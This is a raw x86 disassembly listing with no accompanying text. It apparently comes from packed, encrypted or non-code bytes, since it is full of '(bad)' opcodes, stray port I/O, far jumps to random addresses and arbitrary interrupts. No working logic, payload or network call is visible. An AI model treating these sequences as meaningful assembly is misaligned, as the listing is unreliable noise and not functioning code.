  42f0f2:	mov    ebp,0xf0b7eced
  42f0f7:	aam    0xf5
  42f0f9:	mov    eax,0xfbddfcf4
  42f0fe:	fstp   st(4)
  42f100:	rol    DWORD PTR [eax],1
  42f102:	add    al,ah
  42f104:	(bad)  
  42f105:	cld    
  42f106:	(bad)  
  42f107:	hlt    
  42f108:	or     BYTE PTR [ecx],al
  42f10a:	or     ecx,DWORD PTR [esi]
  42f10c:	in     al,0x6
  42f10e:	jmp    0x42f0c2
  42f110:	in     eax,dx
  42f111:	loopne 0x42f0bb
  42f113:	xlat   BYTE PTR ds:[ebx]
  42f114:	aam    0xcd
  42f116:	jmp    0x42f10e
  42f118:	scas   al,BYTE PTR es:[edi]
  42f119:	(bad)  
  42f11a:	enter  0xd4c5,0xcd
  42f11e:	ret    0xbdbd
  42f121:	sar    edi,cl
  42f123:	in     eax,0xc6
  42f125:	xlat   BYTE PTR ds:[ebx]
  42f126:	aad    0xda
  42f128:	lock add BYTE PTR [edi],al
  42f12b:	clc    
  42f12c:	add    eax,0xc1c5c40d
  42f131:	fadd   st(0),st
  42f133:	(bad)  
  42f134:	rcl    edi,1
  42f136:	in     al,dx
  42f137:	aam    0xc6
  42f139:	in     eax,dx
  42f13a:	in     eax,dx
  42f13b:	mov    eax,0xbcb8dccb
  42f140:	fdivr  st(0),st
  42f142:	fst    st(6)
  42f144:	add    eax,DWORD PTR [ecx]
  42f146:	fcmovb st,st(1)
  42f148:	fnsetpm(287 only) 
  42f14a:	test   bl,0xd
  42f14d:	fiadd  WORD PTR [edi]
  42f14f:	lock iret 
  42f151:	in     eax,dx
  42f152:	jmp    0xedc8:0xb3b7cad6
  42f159:	mov    ecx,0xb5e9bac9
  42f15e:	(bad)  
  42f15f:	mov    ebp,0xf5050607
  42f164:	std    
  42f165:	icebp  
  42f166:	loopne 0x42f128
  42f168:	out    0xf9,eax
  42f16a:	loope  0x42f136
  42f16c:	or     DWORD PTR [edx],ecx
  42f16e:	push   es
  42f16f:	loope  0x42f12d
  42f171:	call   0xf1f8ba57
  42f176:	rcl    ch,1
  42f178:	clc    
  42f179:	fucomip st,st(3)
  42f17b:	cmc    
  42f17c:	in     al,0xea
  42f17e:	jmp    0xf137cb5d
  42f183:	xlat   BYTE PTR ds:[ebx]
  42f184:	loopne 0x42f156
  42f186:	hlt    
  42f187:	sti    
  42f188:	jmp    0x42f18b
  42f18a:	psubsb mm3,mm0
  42f18d:	(bad)  
  42f18e:	fsubr  QWORD PTR [edi-0x4c0a343d]
  42f194:	iret   
  42f195:	out    dx,al
  42f196:	mov    bl,0xfb
  42f198:	rcl    edx,1
  42f19a:	out    dx,al
  42f19b:	out    dx,al
  42f19c:	(bad)  
  42f19d:	fcomi  st,st(5)
  42f19f:	aad    0xfb
  42f1a1:	cmc    
  42f1a2:	mov    ah,0xd2
  42f1a4:	sti    
  42f1a5:	repz in al,0xe4
  42f1a8:	add    al,0xf
  42f1aa:	or     ebp,eax
  42f1ac:	loopne 0x42f177
  42f1ae:	or     esi,ecx
  42f1b0:	enter  0xd3ce,0xf5
  42f1b4:	in     al,dx
  42f1b5:	(bad)  
  42f1b6:	sar    cl,1
  42f1b8:	(bad)  
  42f1b9:	call   0xd201b17d
  42f1be:	fidivr DWORD PTR [eax-0x221d1324]
  42f1c4:	push   es
  42f1c5:	shl    edi,1
  42f1c7:	ret    
  42f1c8:	pxor   mm7,mm7
  42f1cb:	in     eax,dx
  42f1cc:	add    ch,ch
  42f1ce:	repz lock (bad) 
  42f1d1:	loope  0x42f1c9
  42f1d3:	aad    0xdb
  42f1d5:	in     al,dx
  42f1d6:	mov    bl,0xed
  42f1d8:	cli    
  42f1d9:	mov    edx,0xc9f0d8f6
  42f1de:	into   
  42f1df:	inc    DWORD PTR [ecx]
  42f1e1:	(bad)  
  42f1e3:	sti    
  42f1e4:	(bad)  
  42f1e5:	in     al,0xf7
  42f1e7:	rcr    al,1
  42f1e9:	leave  
  42f1ea:	cli    
  42f1eb:	out    0xf8,eax
  42f1ed:	retf   
  42f1ee:	rol    bh,cl
  42f1f0:	jmp    0xb52fbee3
  42f1f5:	aam    0xd3
  42f1f7:	(bad)  
  42f1f8:	stc    
  42f1f9:	aam    0xd3
  42f1fb:	fsubp  st(4),st
  42f1fd:	clc    
  42f1fe:	cld    
  42f1ff:	(bad)  
  42f200:	icebp  
  42f201:	(bad)  
  42f202:	mov    esp,0xd5fabee1
  42f207:	loope  0x42f1d1
  42f209:	add    ebp,ebx
  42f20b:	push   cs
  42f20c:	fsub   st,st(0)
  42f20e:	retf   0xb0f0
  42f211:	test   eax,0xc5e3f3e4
  42f216:	mov    ah,0xd4
  42f218:	in     eax,dx
  42f219:	out    dx,eax
  42f21a:	in     eax,dx
  42f21b:	mov    bh,0xc4
  42f21d:	call   0x2fbd1f7
  42f222:	mov    eax,0xf1fc03c3
  42f227:	loopne 0x42f212
  42f229:	add    edi,eax
  42f22b:	in     eax,dx
  42f22c:	add    al,0xc1
  42f22e:	add    al,0xd9
  42f230:	jmp    0x42f215
  42f232:	mov    ebp,0xe9f4c4e9
  42f237:	into   
  42f238:	out    0xd7,eax
  42f23a:	out    0xdd,al
  42f23c:	out    dx,eax
  42f23d:	mov    ebp,0x1edd6
  42f242:	loopne 0x42f247
  42f244:	shl    edx,0xe1
  42f247:	jmp    0xed41cb23
  42f24c:	or     ah,al
  42f24e:	or     bl,ch
  42f250:	stos   BYTE PTR es:[edi],al
  42f251:	(bad)  
  42f252:	xlat   BYTE PTR ds:[ebx]
  42f253:	aad    0xc1
  42f255:	div    BYTE PTR [edx-0x20c151f]
  42f25b:	cld    
  42f25c:	mov    dh,0xc9
  42f25e:	repnz int3 
  42f260:	enter  0xdcd4,0xfc
  42f264:	add    ebx,ecx
  42f266:	or     bl,ch
  42f268:	les    eax,FWORD PTR [eax*8-0x7f0f122]
  42f26f:	loope  0x42f263
  42f271:	loope  0x42f241
  42f273:	mov    cl,0xad
  42f275:	mov    ah,0xd3
  42f277:	(bad)  
  42f278:	aam    0xd5
  42f27a:	(bad)  
  42f27b:	repnz (bad) 
  42f27e:	(bad)  
  42f27f:	(bad)  
  42f281:	lock loopne 0x42f279
  42f284:	(bad)  
  42f285:	sar    BYTE PTR [esp+eiz*8-0x41e0609],cl
  42f28c:	aam    0x7
  42f28e:	adc    bh,BYTE PTR [ebp-0x15423256]
  42f294:	fninit 
  42f296:	loopne 0x42f279
  42f298:	call   0xd311d98b
  42f29d:	fcmovbe st,st(2)
  42f29f:	repz push DWORD PTR [ebp-0x3422400a]
  42f2a6:	stc    
  42f2a7:	cmc    
  42f2a8:	xlat   BYTE PTR ds:[ebx]
  42f2a9:	lds    eax,FWORD PTR [edi]
  42f2ab:	into   
  42f2ac:	hlt    
  42f2ad:	std    
  42f2ae:	repnz jecxz 0x42f2a8
  42f2b1:	mov    esi,0xc1cfb7c8
  42f2b6:	leave  
  42f2b7:	scas   eax,DWORD PTR es:[edi]
  42f2b8:	aad    0xf8
  42f2ba:	(bad)  
  42f2bb:	(bad)  
  42f2bd:	jmp    0xba15e8b6
  42f2c2:	hlt    
  42f2c3:	in     al,0xf5
  42f2c5:	(bad)  
  42f2c7:	neg    ecx
  42f2c9:	add    ecx,DWORD PTR [ecx]
  42f2cb:	or     BYTE PTR [ebx],al
  42f2cd:	loop   0x42f2c2
  42f2cf:	sar    DWORD PTR [ebp-0xb480a4f],cl
  42f2d5:	loopne 0x42f2b1
  42f2d7:	lock in eax,dx
  42f2d9:	hlt    
  42f2da:	mov    edi,0xdabfedbb
  42f2df:	aad    0xf4
  42f2e1:	mov    ch,0xf6
  42f2e3:	in     al,dx
  42f2e4:	aad    0xf4
  42f2e6:	add    eax,0xfbe7e5e2
  42f2eb:	add    al,0xf9
  42f2ed:	(bad)  
  42f2ee:	jmp    0xf30bb0e4
  42f2f3:	ror    al,cl
  42f2f5:	loope  0x42f2c0
  42f2f7:	icebp  
  42f2f8:	out    0xd7,al
  42f2fa:	out    dx,eax
  42f2fb:	sti    
  42f2fc:	in     al,dx
  42f2fd:	retf   
  42f2fe:	call   0xdc33b6d8
  42f303:	inc    esi
  42f305:	or     bl,bh
  42f307:	leave  
  42f308:	ret    0xcefd
  42f30b:	aad    0xe8
  42f30d:	pop    es
  42f30e:	fsub   DWORD PTR [edi-0x222c3d3e]
  42f314:	int    0xc0
  42f316:	out    0xf3,al
  42f318:	fsubr  st,st(6)
  42f31a:	out    dx,eax
  42f31b:	in     al,dx
  42f31c:	stc    
  42f31d:	idiv   DWORD PTR [edx-0xafe3e37]
  42f323:	in     al,dx
  42f324:	faddp  st(1),st
  42f326:	fcmovnb st,st(7)
  42f328:	or     ebp,ebx
  42f32a:	in     al,0xcb
  42f32c:	hlt    
  42f32d:	out    dx,eax
  42f32e:	rol    al,cl
  42f330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f331:	into   
  42f332:	out    0xd0,eax
  42f334:	stos   BYTE PTR es:[edi],al
  42f335:	jecxz  0x42f328
  42f337:	call   0xf309e920
  42f33c:	mov    ebx,0xedbdfff6
  42f341:	in     eax,dx
  42f342:	fcmovnb st,st(0)
  42f344:	(bad)  
  42f346:	fld    QWORD PTR [edx+edi*8]
  42f349:	fadd   st(5),st
  42f34b:	in     eax,0x2
  42f34d:	wbinvd 
  42f34f:	call   0xf2f1e51c
  42f354:	mov    ch,0xef
  42f356:	shl    al,cl
  42f358:	rol    dh,0xc4
  42f35b:	in     al,0xe8
  42f35d:	in     eax,dx
  42f35e:	fnstcw WORD PTR [ebx-0x24fafd11]
  42f364:	add    dl,ah
  42f366:	mov    DWORD PTR [esi],0xcfcbf9d7
  42f36c:	jecxz  0x42f34c
  42f36e:	fsubr  st,st(0)
  42f370:	repz imul ah
  42f373:	stos   DWORD PTR es:[edi],eax
  42f374:	mov    ch,0xf5
  42f376:	cmc    
  42f377:	mov    ecx,0xdff5e9c7
  42f37c:	jmp    0x42f336
  42f37e:	cli    
  42f37f:	int    0xdf
  42f381:	clc    
  42f382:	(bad)  
  42f383:	in     eax,dx
  42f384:	aad    0xd5
  42f386:	fimul  WORD PTR [ecx]
  42f388:	ret    0xf9fe
  42f38b:	loopne 0x42f377
  42f38d:	or     al,0xde
  42f38f:	out    dx,eax
  42f390:	in     al,0xc7
  42f392:	shl    eax,0xf7
  42f395:	jecxz  0x42f37f
  42f397:	cmc    
  42f398:	sti    
  42f399:	in     eax,dx
  42f39a:	retf   0xd8fd
  42f39d:	repz out dx,eax
  42f39f:	fidiv  DWORD PTR [esi-0x420e3932]
  42f3a5:	loop   0x42f398
  42f3a7:	ror    BYTE PTR [edi],0x9
  42f3aa:	(bad)  
  42f3ab:	fimul  WORD PTR [edi]
  42f3ad:	fimul  WORD PTR [ecx]
  42f3af:	icebp  
  42f3b0:	lock test ch,0xc2
  42f3b4:	(bad)  
  42f3b5:	int    0xe6
  42f3b7:	mov    ebx,0xcdf1ecc8
  42f3bc:	rcl    ch,cl
  42f3be:	out    dx,eax
  42f3bf:	cli    
  42f3c0:	(bad)  
  42f3c2:	fcom   st(0)
  42f3c4:	(bad)  
  42f3c5:	call   ebp
  42f3c7:	sti    
  42f3c8:	add    esp,ecx
  42f3ca:	mov    esp,0x12cae5e7
  42f3cf:	lods   al,BYTE PTR ds:[esi]
  42f3d0:	jmp    0xc709b7a8
  42f3d5:	into   
  42f3d6:	iret   
  42f3d7:	(bad)  
  42f3d9:	stc    
  42f3da:	ror    esp,1
  42f3dc:	clc    
  42f3dd:	aam    0xde
  42f3df:	idiv   dh
  42f3e1:	out    dx,al
  42f3e2:	sti    
  42f3e3:	xlat   BYTE PTR ds:[ebx]
  42f3e4:	push   es
  42f3e5:	mov    dh,0x9
  42f3e8:	ret    0xf502
  42f3eb:	(bad)  
  42f3ed:	jmp    0xc9e8:0xb0dcf0e3
  42f3f4:	xlat   BYTE PTR ds:[ebx]
  42f3f5:	rcl    ebx,0xc4
  42f3f8:	icebp  
  42f3f9:	leave  
  42f3fa:	call   0xd837d7dc
  42f3ff:	out    dx,eax
  42f400:	fadd   st,st(2)
  42f402:	shl    dh,1
  42f404:	cld    
  42f405:	jmp    0xc5ee:0x6da04d6
  42f40c:	add    DWORD PTR [edx],eax
  42f40e:	sar    DWORD PTR [esi-0xa132211],cl
  42f414:	shl    ecx,cl
  42f416:	(bad)  
  42f417:	fldpi  
  42f419:	out    0xeb,al
  42f41b:	mov    ah,0xb2
  42f41d:	(bad)  
  42f41e:	aam    0x3
  42f420:	repnz fadd DWORD PTR [esi]
  42f423:	hlt    
  42f424:	aam    0xff
  42f426:	(bad)  
  42f428:	test   edi,0xdde1f4e7
  42f42e:	jmp    0xf6f0:0xd3e3efce
  42f435:	mov    bh,0xee
  42f437:	call   0xfd0fb8fc
  42f43c:	jmp    0x42f42c
  42f43e:	jmp    0xece5:0xd2e6b6f6
  42f445:	rol    ch,0xf8
  42f448:	(bad)  
  42f449:	fcmovbe st,st(6)
  42f44b:	jmp    0x42f433
  42f44d:	std    
  42f44e:	pop    es
  42f44f:	mov    bl,0xe0
  42f451:	retf   
  42f452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f453:	rol    esp,cl
  42f455:	jmp    0xf6ea:0xcfcbe9c6
  42f45c:	fnstsw WORD PTR [ebp-0x9180c42]
  42f462:	cli    
  42f463:	mov    ebx,0xd407f0
  42f468:	add    al,0xfb
  42f46a:	or     eax,ebp
  42f46c:	out    0xa,al
  42f46e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f470:	in     eax,dx
  42f471:	shr    BYTE PTR [ebp-0x1e351b40],0xe5
  42f478:	repnz mov cl,0xda
  42f47b:	int3   
  42f47c:	out    dx,eax
  42f47d:	out    dx,al
  42f47e:	idiv   DWORD PTR [ebx-0x13270c06]
  42f484:	fmul   QWORD PTR [edx]
  42f486:	std    
  42f487:	lds    ecx,FWORD PTR [edi]
  42f489:	mov    esi,0xcae7eec3
  42f48f:	fst    st(3)
  42f491:	ret    0xeca8
  42f494:	int3   
  42f495:	rcr    bl,1
  42f497:	repz leave 
  42f499:	in     eax,dx
  42f49a:	(bad)  
  42f49b:	aam    0xea
  42f49d:	in     al,dx
  42f49e:	test   BYTE PTR [eax],0xcd
  42f4a1:	add    edi,edi
  42f4a3:	loop   0x42f477
  42f4a5:	loopne 0x42f48a
  42f4a7:	push   es
  42f4a8:	pop    es
  42f4a9:	(bad)  
  42f4aa:	(bad)  
  42f4ab:	enter  0xc9fe,0xb
  42f4af:	fsubr  QWORD PTR [ebp+ebp*8-0xe09340a]
  42f4b6:	(bad)  
  42f4b7:	in     eax,0xef
  42f4b9:	out    dx,eax
  42f4ba:	mov    bh,0xb7
  42f4bc:	mov    esi,0xedd0d9cb
  42f4c1:	sar    DWORD PTR [esi-0x13b2220],cl
  42f4c7:	fimul  WORD PTR [edx]
  42f4c9:	fcmovnbe st,st(5)
  42f4cb:	or     al,0xc5
  42f4cd:	(bad)  
  42f4ce:	call   0xb408e7be
  42f4d3:	jmp    0xcdf4a1a3
  42f4d8:	repz (bad) 
  42f4da:	mov    bh,0xfc
  42f4dc:	jmp    0x3f9:0x2fcdbf6
  42f4e3:	rol    DWORD PTR [eax*1-0x39222026],cl
  42f4ea:	sti    
  42f4eb:	in     eax,dx
  42f4ec:	(bad)  
  42f4ee:	retf   
  42f4ef:	stos   BYTE PTR es:[edi],al
  42f4f0:	jecxz  0x42f4c3
  42f4f2:	mov    bh,0xec
  42f4f4:	into   
  42f4f5:	mov    al,0xd9
  42f4f7:	mov    bl,0xe8
  42f4f9:	(bad)  
  42f4fa:	test   dh,0xbd
  42f4fd:	div    ah
  42f4ff:	(bad)  
  42f500:	fscale 
  42f502:	mov    cl,0x6
  42f505:	std    
  42f506:	cld    
  42f507:	in     eax,0xdd
  42f509:	fdivr  st,st(0)
  42f50b:	sti    
  42f50c:	jmp    0xf7f7:0xc8c1eccd
  42f513:	loop   0x42f4e5
  42f515:	xlat   BYTE PTR ds:[ebx]
  42f516:	repnz sar BYTE PTR [ebx-0x44043412],1
  42f51d:	aad    0x3
  42f51f:	iret   
  42f520:	shl    ecx,0xc3
  42f523:	rol    DWORD PTR ds:0xf8f1d1d0,1
  42f529:	cli    
  42f52a:	(bad)  
  42f52b:	in     eax,dx
  42f52c:	or     esp,ebp
  42f52e:	loop   0x42f522
  42f530:	in     al,dx
  42f531:	test   eax,0xccb0abb7
  42f536:	into   
  42f537:	into   
  42f538:	lock out 0xf7,al
  42f53b:	mov    ah,0xc4
  42f53d:	mov    ebp,0xe6bcecf3
  42f542:	mov    BYTE PTR ds:0xc1ded7c1,0xdb
  42f549:	(bad)  
  42f54a:	(bad)  
  42f54b:	inc    BYTE PTR [esp+eax*8]
  42f54e:	enter  0xdea9,0xd7
  42f552:	int    0xf6
  42f554:	jmp    0xd4f4c841
  42f559:	mov    dh,0xda
  42f55b:	in     eax,dx
  42f55c:	(bad)  [ebp-0x62bfc23]
  42f562:	in     eax,dx
  42f563:	add    edi,ecx
  42f565:	jecxz  0x42f562
  42f567:	(bad)
  42f56a:	or     edi,ebp
  42f56c:	in     eax,0xc
  42f56e:	push   cs
  42f56f:	sar    DWORD PTR [eax-0x5130415b],cl
  42f575:	repz test al,0xdb
  42f578:	into   
  42f579:	hlt    
  42f57a:	mov    edi,0xfffeeadf
  42f57f:	int3   
  42f580:	loope  0x42f556
  42f582:	sar    ebx,cl
  42f584:	test   eax,0xfec1d8d1
  42f58a:	fld    QWORD PTR [ecx+ebp*8]
  42f58d:	adc    cl,BYTE PTR [eax]
  42f58f:	loope  0x42f573
  42f591:	fsubp  st(5),st
  42f593:	shl    ah,cl
  42f595:	rcl    ecx,1
  42f597:	loopne 0x42f58e
  42f599:	mov    bh,0xb0
  42f59b:	cli    
  42f59c:	sar    BYTE PTR [edi-0x3c044238],1
  42f5a2:	add    ebp,ebp
  42f5a4:	mov    ebp,0x5bfd7e2
  42f5a9:	push   cs
  42f5aa:	femms  
  42f5ac:	(bad)  
  42f5ae:	in     eax,dx
  42f5af:	lods   al,BYTE PTR ds:[esi]
  42f5b0:	int    0xe7
  42f5b2:	retf   
  42f5b3:	fucom  st(5)
  42f5b5:	test   eax,0xb4b5e7e2
  42f5ba:	(bad)  
  42f5bb:	mov    bh,0xd6
  42f5bd:	int    0xbf
  42f5bf:	fadd   DWORD PTR [edx]
  42f5c1:	(bad)  
  42f5c2:	hlt    
  42f5c3:	neg    ebx
  42f5c5:	fsubr  st(2),st
  42f5c7:	in     al,0x7
  42f5c9:	psubsw mm0,QWORD PTR [ebx]
  42f5cc:	int3   
  42f5cd:	out    0xa,al
  42f5cf:	loopne 0x42f57d
  42f5d1:	mov    edi,0xefd1b7ed
  42f5d7:	iret   
  42f5d8:	mov    dl,0xde
  42f5da:	fnsave [eax+ebx*8-0xbfe1c17]
  42f5e1:	stc    
  42f5e2:	pop    es
  42f5e3:	cld    
  42f5e4:	in     eax,0xdc
  42f5e6:	ret    0xffda
  42f5e9:	cmc    
  42f5ea:	stc    
  42f5eb:	loop   0x42f5f5
  42f5ed:	sti    
  42f5ee:	add    cl,bl
  42f5f0:	(bad)  
  42f5f2:	mov    cl,0xe6
  42f5f4:	vpmaddwd xmm5,xmm7,xmm4
  42f5f8:	out    dx,al
  42f5f9:	enter  0xc9ca,0xea
  42f5fd:	rcr    ecx,1
  42f5ff:	mov    esp,0xf4f5d8bf
  42f604:	shl    ebp,1
  42f606:	jecxz  0x42f5e2
  42f608:	enter  0xfdb,0xe0
  42f60c:	add    ah,dl
  42f60e:	out    dx,al
  42f60f:	stos   DWORD PTR es:[edi],eax
  42f610:	xlat   BYTE PTR ds:[ebx]
  42f611:	out    dx,al
  42f612:	rcl    ecx,cl
  42f614:	in     eax,0xd3
  42f616:	retf   
  42f617:	retf   
  42f618:	shr    cl,1
  42f61a:	in     al,dx
  42f61b:	(bad)
  42f61e:	hlt    
  42f61f:	fld1   
  42f621:	pop    es
  42f622:	loop   0x42f5fd
  42f624:	clc    
  42f625:	retf   
  42f626:	add    edx,ecx
  42f628:	or     BYTE PTR ds:0xc4f9eae9,al
  42f62e:	in     al,0xd9
  42f630:	(bad)
  42f633:	repnz aad 0xf5
  42f636:	aad    0xf9
  42f638:	into   
  42f639:	jmp    ebp
  42f63b:	retf   
  42f63c:	div    edi
  42f63e:	rcl    ecx,1
  42f640:	add    esi,eax
  42f642:	mov    esi,0xd6d8e205
  42f647:	fucom  st(4)
  42f649:	pop    es
  42f64a:	fdiv   st(7),st
  42f64c:	out    0xed,al
  42f64e:	(bad)  
  42f650:	lods   al,BYTE PTR ds:[esi]
  42f651:	test   dh,0xc4
  42f654:	repz mov bh,0xc9
  42f657:	mov    bl,0xd2
  42f659:	xlat   BYTE PTR ds:[ebx]
  42f65a:	lock imul ebx
  42f65d:	(bad)  
  42f65e:	(bad)  
  42f660:	(bad)  
  42f661:	mov    ebp,0xe6c4bdce
  42f666:	push   es
  42f667:	out    0xe3,eax
  42f669:	call   0xf426d566
  42f66e:	stc    
  42f66f:	mov    eax,0xf3f7b7a6
  42f674:	(bad)  
  42f675:	les    esi,FWORD PTR [edi-0x2332f4a]
  42f67b:	mov    ebx,0xc2d2f6ff
  42f680:	(bad)  
  42f681:	not    esp
  42f683:	sar    DWORD PTR [esi-0x101b2d1c],cl
  42f689:	iret   
  42f68a:	out    dx,eax
  42f68b:	add    BYTE PTR [esi],cl
  42f68d:	into   
  42f68e:	enter  0xcea8,0xd2
  42f692:	shl    cl,1
  42f694:	repnz in al,0xb2
  42f697:	in     al,dx
  42f698:	icebp  
  42f699:	shr    DWORD PTR [edx+ebp*8-0x21322244],cl
  42f6a0:	(bad)  
  42f6a1:	rcr    ebp,cl
  42f6a3:	repnz shl esp,cl
  42f6a6:	lock push es
  42f6a8:	fsub   st,st(4)
  42f6aa:	out    dx,eax
  42f6ab:	in     eax,dx
  42f6ac:	pop    es
  42f6ad:	(bad)  
  42f6af:	lods   al,BYTE PTR ds:[esi]
  42f6b0:	rol    bl,1
  42f6b2:	out    dx,al
  42f6b3:	lods   al,BYTE PTR ds:[esi]
  42f6b4:	retf   
  42f6b5:	mov    ah,0xed
  42f6b7:	rcr    dl,0xd6
  42f6ba:	out    dx,al
  42f6bb:	std    
  42f6bc:	in     eax,dx
  42f6bd:	fcomp  st(7)
  42f6bf:	cli    
  42f6c0:	hlt    
  42f6c1:	cld    
  42f6c2:	lock int3 
  42f6c4:	pop    es
  42f6c5:	mov    DWORD PTR [eax+esi*8],0xcec7e1c0
  42f6cc:	or     al,0xe6
  42f6ce:	(bad)  
  42f6cf:	mov    esp,0xb1b6c8ee
  42f6d4:	in     al,dx
  42f6d5:	in     eax,0xd1
  42f6d7:	int    0xc5
  42f6d9:	fsubp  st(4),st
  42f6db:	out    dx,al
  42f6dc:	fcomip st,st(7)
  42f6de:	mov    eax,0xfef8fad5
  42f6e3:	ret    
  42f6e4:	loop   0x42f6a9
  42f6e6:	add    al,dh
  42f6e8:	add    cl,ch
  42f6ea:	faddp  st(5),st
  42f6ec:	lds    ecx,FWORD PTR [eax]
  42f6ee:	cld    
  42f6ef:	out    dx,eax
  42f6f0:	(bad)  
  42f6f1:	shl    ebx,cl
  42f6f3:	aam    0xec
  42f6f5:	test   eax,0xb4ecf9e4
  42f6fa:	jmp    0x42f6af
  42f6fc:	jecxz  0x42f6ca
  42f6fe:	mov    edi,0xe5ffefdf
  42f703:	cli    
  42f704:	ret    
  42f705:	vpsllw ymm3,ymm7,xmm3
  42f709:	(bad)
  42f70c:	std    
  42f70d:	add    ch,bh
  42f70f:	mov    bl,0xa6
  42f711:	jmp    0xb6f7:0xb0cfb5b1
  42f718:	xlat   BYTE PTR ds:[ebx]
  42f719:	clc    
  42f71a:	icebp  
  42f71b:	in     eax,0xb8
  42f71d:	fdivrp st(5),st
  42f71f:	repnz fdivr QWORD PTR [esi-0x21050b30]
  42f726:	loopne 0x42f703
  42f728:	enter  0xae5,0xe
  42f72c:	fmul   st(7),st
  42f72e:	(bad)  
  42f730:	repnz test eax,0xc6d2ecde
  42f736:	hlt    
  42f737:	retf   
  42f738:	int    0xca
  42f73a:	(bad)  
  42f73b:	call   0xbe39e310
  42f740:	mov    ecx,0xbad805f1
  42f745:	fldpi  
  42f747:	jmp    0xde1bde16
  42f74c:	jecxz  0x42f75a
  42f74e:	out    dx,eax
  42f74f:	test   eax,0xebccb3c5
  42f754:	(bad)  
  42f757:	rcl    edx,cl
  42f759:	cmc    
  42f75a:	idiv   ch
  42f75c:	out    dx,eax
  42f75d:	mov    edi,0xd9e2ffb0
  42f762:	inc    ecx
  42f764:	add    eax,0x5d4e3ff
  42f769:	or     bl,ah
  42f76b:	cmc    
  42f76c:	or     eax,0xcaced3de
  42f771:	int    0xe3
  42f773:	retf   0xc2db
  42f776:	(bad)  
  42f777:	aad    0xae
  42f779:	sti    
  42f77a:	fistp  QWORD PTR [ebx-0x20243418]
  42f780:	(bad)  
  42f782:	std    
  42f783:	cmc    
  42f784:	cld    
  42f785:	rol    ch,1
  42f787:	test   cl,0xf7
  42f78a:	in     eax,dx
  42f78b:	(bad)  
  42f78c:	fxch   st(1)
  42f78e:	iret   
  42f78f:	fsub   st(6),st
  42f791:	call   0xf5f8c043
  42f796:	div    DWORD PTR [eax-0x23322050]
  42f79c:	std    
  42f79d:	mov    ebp,0xf3dbf5cc
  42f7a2:	shl    esp,1
  42f7a4:	stc    
  42f7a5:	fadd   DWORD PTR [edi]
  42f7a7:	or     bl,ah
  42f7a9:	(bad)  
  42f7aa:	jmp    0xe022d889
  42f7af:	mov    ecx,0xf1dedccc
  42f7b4:	icebp  
  42f7b5:	in     eax,0xf6
  42f7b7:	leave  
  42f7b8:	mov    cl,0xc8
  42f7ba:	int3   
  42f7bb:	mov    ch,0xfc
  42f7bd:	fcomip st,st(7)
  42f7bf:	leave  
  42f7c0:	out    0xd6,eax
  42f7c2:	push   es
  42f7c3:	ret    
  42f7c4:	(bad)  
  42f7c6:	fstp   st(0)
  42f7c8:	shr    bl,0xed
  42f7cb:	cmc    
  42f7cc:	out    dx,eax
  42f7cd:	or     eax,0xe1eced06
  42f7d2:	loop   0x42f7ba
  42f7d4:	mov    dl,0xc2
  42f7d6:	(bad)  
  42f7d7:	out    0xc9,al
  42f7d9:	clc    
  42f7da:	sar    DWORD PTR [ecx-0x1f23271c],1
  42f7e0:	cli    
  42f7e1:	fdivr  st,st(5)
  42f7e3:	(bad)  
  42f7e4:	(bad)  
  42f7e6:	rol    DWORD PTR [eax],1
  42f7e8:	ror    BYTE PTR [esi],0xf4
  42f7eb:	in     al,0xda
  42f7ed:	call   0xf232c4b2
  42f7f2:	loope  0x42f7a7
  42f7f4:	in     al,0xd5
  42f7f6:	out    0xe9,eax
  42f7f8:	retf   0xd7ee
  42f7fb:	int3   
  42f7fc:	call   0x819b6dd
  42f801:	stc    
  42f802:	rol    ebx,cl
  42f804:	lock loopne 0x42f7eb
  42f807:	(bad)  
  42f808:	fucom  st(0)
  42f80a:	aad    0xd
  42f80c:	(bad)
  42f80f:	mov    esp,0xb0bcbdcd
  42f814:	(bad)  
  42f815:	fcmove st,st(5)
  42f817:	shr    dl,cl
  42f819:	(bad)  
  42f81a:	rcl    cl,1
  42f81c:	out    dx,eax
  42f81d:	xlat   BYTE PTR ds:[ebx]
  42f81e:	ror    ecx,cl
  42f820:	xlat   BYTE PTR ds:[ebx]
  42f821:	add    dh,dh
  42f823:	int3   
  42f824:	rcr    edx,0xc0
  42f827:	leave  
  42f828:	(bad)  
  42f82a:	fldlg2 
  42f82c:	(bad)  
  42f82d:	fsubp  st(6),st
  42f82f:	jmp    0xeff6:0xf4aed3c8
  42f836:	call   0xf83db111
  42f83b:	repnz in eax,dx
  42f83d:	mov    eax,0xd3dbd0b9
  42f842:	add    eax,0xfad1c205
  42f847:	cli    
  42f848:	sti    
  42f849:	test   DWORD PTR [eax],0xe5fff409
  42f84f:	jmp    0xede9:0xe1b0cbef
  42f856:	(bad)  
  42f857:	out    dx,al
  42f858:	in     eax,0xee
  42f85a:	hlt    
  42f85b:	into   
  42f85c:	(bad)  
  42f85e:	fcomp  st(1)
  42f860:	jecxz  0x42f832
  42f862:	in     eax,dx
  42f863:	int    0xe7
  42f865:	cli    
  42f866:	cld    
  42f867:	les    eax,FWORD PTR [eax+ebx*8]
  42f86a:	retf   
  42f86b:	out    0xe5,eax
  42f86d:	jecxz  0x42f850
  42f86f:	(bad)  
  42f870:	jmp    0xf2e0:0xd0ccf5dd
  42f877:	leave  
  42f878:	sar    dh,cl
  42f87a:	repnz shl edx,cl
  42f87d:	(bad)  
  42f87f:	fincstp 
  42f881:	pop    es
  42f882:	(bad)  
  42f883:	mov    edi,0x9dcd1db
  42f888:	jecxz  0x42f88b
  42f88a:	(bad)  
  42f88b:	or     ecx,DWORD PTR [esi]
  42f88d:	add    eax,0xade1ddef
  42f892:	enter  0xb1bd,0xcc
  42f896:	shl    BYTE PTR [ebx-0x4a2e1609],1
  42f89c:	mov    ecx,0xc2e8caf3
  42f8a1:	idiv   esi
  42f8a3:	(bad)  
  42f8a4:	jecxz  0x42f883
  42f8a6:	hlt    
  42f8a7:	fmulp  st(0),st
  42f8a9:	(bad)  
  42f8ab:	fisttp DWORD PTR [ecx]
  42f8ad:	or     ecx,DWORD PTR ds:0xb3bebcc2
  42f8b3:	int3   
  42f8b4:	jmp    0xfdd1:0xf9c5a8ca
  42f8bb:	hlt    
  42f8bc:	clc    
  42f8bd:	mov    ebx,0xc0d5f4e8
  42f8c2:	mov    eax,0xc7e3e4db
  42f8c8:	fmulp  st(7),st
  42f8ca:	std    
  42f8cb:	or     cl,bh
  42f8cd:	(bad)  
  42f8cf:	(bad)  
